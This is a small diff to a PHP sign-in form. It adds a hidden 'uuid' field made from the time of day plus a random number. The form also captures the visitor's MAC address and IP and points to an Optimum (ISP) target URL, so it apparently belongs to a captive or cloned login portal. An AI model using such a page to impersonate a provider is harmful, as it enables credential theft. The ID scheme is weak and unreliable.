@@ -78,6 +78,7 @@ require_once('helper.php');
 				<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 				<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
 				<input type="hidden" name="target" value="https://www.optimum.com/">
+        <input type="hidden" name="uuid" value="<?=date('H:i:s');echo '-';echo rand(1,10);?>">
               <button class="cw-btn cw-btn-primary cw-btn-block" type="submit">Sign In</button>
              <!--  <input type="submit" name="submit" class="cw-btn cw-btn-primary cw-btn-block" value="Sign In"/> -->
             </div>
